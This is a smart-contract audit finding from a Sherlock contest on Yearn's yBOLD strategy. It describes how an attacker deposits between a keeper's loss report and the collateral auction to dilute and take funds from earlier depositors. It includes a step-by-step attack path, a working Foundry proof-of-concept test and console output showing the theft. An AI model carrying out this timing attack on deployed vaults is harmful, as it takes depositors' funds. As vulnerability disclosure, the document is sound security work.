---
tags:
  - lang/solidity
  - lang/vyper
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/cdp
  - sector/lending
  - sector/token
  - sector/vault
  - sector/yield-aggregator
protocol: "[[Yearn]]"
auditors:
  - "[[0x15]]"
  - "[[Obsidian]]"
report: "https://github.com/sherlock-audit/2025-05-yearn-ybold-judging"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[frontrun-exposure]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-manipulation-resistance]]"
---
# H-2: Attacker can deposit after the keeper reports a loss, but before the collateral auction to steal from other depositors

- id: 57687
- impact: HIGH
- protocol: [[Yearn]] yBOLD
- reporter: 0x15 (Sherlock)
- source: N/A

## Summary


The report highlights a vulnerability in the Yearn yBOLD strategy where an attacker can exploit the timing between when a loss is reported and when the associated collateral is later auctioned and reported as profit. This allows the attacker to deposit at a lower share price and redeem at a higher price, stealing from other depositors. The root cause of this issue is due to the strategy temporarily holding unprocessed collateral gains after liquidations in the Stability Pool. The impact of this vulnerability is significant as the attacker can steal a large percentage of assets from other depositors. A proof of concept (PoC) is provided to demonstrate how this attack can be carried out. No mitigation has been proposed at this time. 

## Details

Source: https://github.com/sherlock-audit/2025-05-yearn-ybold-judging/issues/155 

## Found by 
0x15, Obsidian

### Summary

An attacker can exploit the timing between when a loss is reported and when the associated collateral is later auctioned and reported as profit. By depositing in between these events, the attacker mints undervalued shares and redeems them at a profit, stealing from prior depositors.

### Root Cause

If there have been [liquidations in the Stability Pool](https://github.com/liquity/bold/blob/36139d909fcc4d2c2918d7fd2b20b11951138ccb/contracts/src/StabilityPool.sol#L24-L25) that reduced the strategy's BOLD balance, and the resulting collateral has not yet been auctioned, the strategy temporarily holds unprocessed collateral gains. When the keeper calls `report()` during this state, the strategy records a loss, since the BOLD balance decreased but the collateral value has not yet been realized. This lowers the price per share.

An attacker can exploit this by depositing right after the loss is reported, minting shares at a discounted rate. Then, once the collateral is auctioned and converted back to BOLD, the next `report()` reflects a profit, restoring the price per share. The attacker can now redeem their shares at this higher valuation, extracting more than they put in.

The loss is effectively socialized onto the original depositors, whose share value was diluted by the attacker's well-timed entry and exit.

### Internal Pre-conditions

`management` has to do only **one** of the following:

- `setDoHealthCheck(false)`
- set the loss limit ratio via `setLossLimitRatio` to some % > 0, for example 10% or 50%

This is to ensure that the loss is reported after the stability pool liquidation occurs.

The README states:
> However, if any role is able to set a value in a way that could result in the theft of depositor funds, this would be considered a valid finding. No role should be capable of stealing from depositors or permanently blocking withdrawals.

This issue shows how management can maliciously steal funds (not yield) from depositors, due to the temporary loss that can be reported after Liquity stability pool liquidations.

### External Pre-conditions

There must be some collateral gains in the stability pool from liquidations

### Attack Path

1. User deposits assets into the strategy
2. Stability pool decreases BOLD and increases collateral gains from liquidations
3. Keeper calls `report` to report the loss, reducing price per share
4. Attacker deposits assets into the strategy, at a discounted price per share
5. Keeper calls `tend` to sell the collateral for BOLD
6. Keeper calls `report` to account for the sold collateral, this increases price per share
7. Attacker redeems all their shares, at a higher price per share for a profit

Note: The attacker can frontrun the keeper's step 3 by performing the liquidations if necessary

### Impact

Attacker can steal a significant % of the assets from other depositors, in the case of the POC it shows an attacker stealing over 30% of a depositor's funds

### PoC

Add this helper function to Setup.sol

```solidity
function simulateLargeLiquidation(uint256 _debtToOffset, uint256 _collToAdd) public {
        IStabilityPool _stabilityPool = IStabilityPool(stabilityPool);

        // Simulate the liquidation by calling offset on the stability pool
        vm.prank(address(_stabilityPool.troveManager()));
        _stabilityPool.offset(_debtToOffset, _collToAdd);
    }
```

Add the following test to `Operation.t.sol`

```solidity
    function test_POC__Attack__Final() public {
        setFees(0, 0);

        vm.startPrank(management);
        strategy.setDoHealthCheck(false);
        strategy.setProfitMaxUnlockTime(0);
        vm.stopPrank();

        // User deposits into the strategy
        uint256 userDepositAmount= 100e18;
        mintAndDepositIntoStrategy(strategy, user, userDepositAmount);

        // Earn Collateral, lose principal
        simulateLargeLiquidation(1000000e18, 1000e18);

        IStabilityPool _stabilityPool = IStabilityPool(strategy.SP());
        uint256 _expectedCollateralGain = _stabilityPool.getDepositorCollGain(address(strategy));
        assertEq(ERC20(strategy.COLL()).balanceOf(address(strategy)), 0);

        // Report the loss
        vm.prank(keeper);
        (uint256 profitFromReport, uint256 lossFromReport) = strategy.report();

        // Attacker frontruns the call to `tend` and `report` by depositing
        address attacker = address(98989898);
        uint256 attackerDepositAmount = 100e18;
        airdrop(asset, attacker, attackerDepositAmount);
        depositIntoStrategy(strategy, attacker, attackerDepositAmount);

        // Call tend and simulate the auction process to sell the collateral to repay the initial "loss"
        vm.prank(keeper);
        strategy.tend();
        airdrop(asset, address(strategy), lossFromReport);

        // Report 
        vm.prank(keeper);
        (uint256 profit, uint256 loss) = strategy.report();

        // Attacker redeems all their shares for a profit, 
        // stealing from the other depositor who is left with a loss the same amount
        vm.startPrank(attacker);
        strategy.redeem(strategy.balanceOf(attacker), attacker, attacker);
        console.log("attacker profit %e", asset.balanceOf(attacker) - attackerDepositAmount);

        // user redeems all their shares for a loss
        vm.startPrank(user);
        strategy.redeem(strategy.balanceOf(user), user, user);
        console.log("user loss %e", userDepositAmount - asset.balanceOf(user));
    }
```

**Console output:**

```bash
Ran 1 test for src/test/Operation.t.sol:OperationTest
[PASS] test_POC__Attack__Final() (gas: 1240200)
Logs:
  attacker profit 3.2545605454869741322e19
  user loss 3.2545605454869741322e19

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 252.33ms (5.00ms CPU time)

Ran 1 test suite in 253.45ms (252.33ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

_No response_
